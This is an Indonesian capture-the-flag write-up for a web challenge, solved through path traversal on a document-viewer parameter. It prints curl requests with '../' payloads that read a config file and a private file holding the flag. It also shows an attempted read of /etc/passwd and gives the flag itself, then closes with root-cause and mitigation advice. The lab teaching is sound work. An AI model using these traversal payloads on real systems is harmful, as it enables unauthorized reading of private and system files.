# Lawang Sewu — Writeup

- **Kategori:** Web Exploitation
- **Teknik:** Path Traversal / Local File Inclusion (LFI)
- **Poin:** 85 (dynamic, awal 100 / min 50)
- **Target:** `http://103.196.155.224:8101`
- **Flag:** `CF2{web_lawang_sewu_e4710b37cd0f26958ead}`

## Deskripsi Soal

> Portal arsip menampilkan dokumen lewat pemilih halaman. Temukan berkas internal yang tidak semestinya dapat dibaca.

Dua kata kunci dari hint:
- *"pemilih halaman"* → ada parameter yang menentukan file mana yang dibaca.
- *"berkas internal yang tidak semestinya dapat dibaca"* → ada file privat yang bisa diakses lewat celah → arah **path traversal / LFI**.

## Recon

Halaman utama menampilkan portal arsip dengan beberapa link dokumen:

```
$ curl -s http://103.196.155.224:8101/
```
```html
<h1>Portal Arsip Lawang Sewu</h1>
<ul>
  <li><a href="/arsip?page=sejarah.txt">Sejarah Lawang Sewu</a></li>
  <li><a href="/arsip?page=arsitektur.txt">Arsitektur Bangunan</a></li>
  <li><a href="/arsip?page=galeri.txt">Galeri Foto</a></li>
  <li><a href="/arsip?page=kunjungan.txt">Informasi Kunjungan</a></li>
</ul>
<p><a href="/arsip?page=../config.ini">Konfigurasi arsip</a></p>
```

- Server header: `Server: Arsip/1.0 Python/3.12.15` → aplikasi Python custom (bukan framework umum).
- Endpoint kuncinya: **`/arsip?page=<nama_file>`**. Parameter `page` inilah "pemilih halaman" yang dipakai untuk membaca file apa adanya.
- Ada link yang sudah memakai `../` (`/arsip?page=../config.ini`) → indikasi kuat `page` di-resolve sebagai path file.

## Menggali Struktur

Membaca dokumen publik biasa:

```
$ curl -s "http://103.196.155.224:8101/arsip?page=sejarah.txt"
```
```
ARSIP LAWANG SEWU — SEJARAH
...
Dokumen ini adalah dokumen publik. Dokumen internal arsip tidak
ditampilkan di portal ini.
```

Membaca `config.ini` (naik satu level dengan `../`):

```
$ curl -s "http://103.196.155.224:8101/arsip?page=../config.ini"
```
```ini
[arsip]
direktori_publik = public
direktori_pribadi = private
; Dokumen internal (tanda terima) tersimpan di direktori pribadi.
; Nama berkas: receipt.txt
; Akses dokumen internal hanya untuk staf arsip.
```

Config membocorkan semua yang diperlukan:
- Dokumen publik di folder `public/`.
- Dokumen privat di folder `private/`.
- File internalnya bernama **`receipt.txt`**.

Karena `../config.ini` berhasil, berarti `page` di-resolve **relatif terhadap folder `public/`**, dan `../` bisa naik ke direktori induk (base dir).

Struktur yang disimpulkan:

```
base/
├── config.ini
├── public/            ← basis untuk parameter page
│   ├── sejarah.txt
│   ├── arsitektur.txt
│   ├── galeri.txt
│   └── kunjungan.txt
└── private/
    └── receipt.txt    ← TARGET
```

## Eksploitasi

Dari `public/`, naik satu level lalu masuk `private/`:

```
$ curl -s "http://103.196.155.224:8101/arsip?page=../private/receipt.txt"
```
```
CF2{web_lawang_sewu_e4710b37cd0f26958ead}
```

**Flag:**
```
CF2{web_lawang_sewu_e4710b37cd0f26958ead}
```

## Catatan: Soal Filter

Ada filter yang memblokir traversal **keluar** dari aplikasi:

```
$ curl -s "http://103.196.155.224:8101/arsip?page=../../../../../../etc/passwd"
Akses ditolak.
```

Tapi filter itu **tidak** mencegah pergerakan di dalam direktori aplikasi, sehingga `../private/receipt.txt` tetap lolos. Beberapa percobaan path:

| Payload                                      | Hasil                     |
| -------------------------------------------- | ------------------------- |
| `sejarah.txt`                                | OK (dokumen publik)       |
| `../config.ini`                              | OK (bocoran konfigurasi)  |
| `../../../../../../etc/passwd`               | `Akses ditolak.` (difilter) |
| `private/receipt.txt`                        | `Dokumen tidak ditemukan.` (basis = `public/`) |
| `../private/receipt.txt`                     | **Flag** ✅                |

## Root Cause & Mitigasi

**Akar masalah:** parameter `page` dipakai langsung untuk menyusun path file (`public/ + page`) tanpa normalisasi/kanonikalisasi path. Filter yang ada hanya mencegah keluar dari filesystem (mis. ke `/etc`), bukan membatasi akses ke dalam folder `public/` saja — sehingga `../private/` masih terjangkau.

**Mitigasi:**
- **Whitelist**: tolak request yang file-nya tidak ada di daftar dokumen publik yang diizinkan.
- **Kanonikalisasi lalu validasi prefix**: resolve path (`os.path.realpath`), lalu pastikan hasilnya masih berada di dalam folder `public/` (mis. `realpath.startswith(public_dir)`). Tolak jika tidak.
- **Buang komponen `..`** dan tolak path absolut sebelum menggabungkan.
- Jangan simpan file sensitif sebagai sibling dari folder yang bisa diakses user; dan jangan membocorkan nama direktori/berkas lewat `config.ini` yang ikut terbaca.
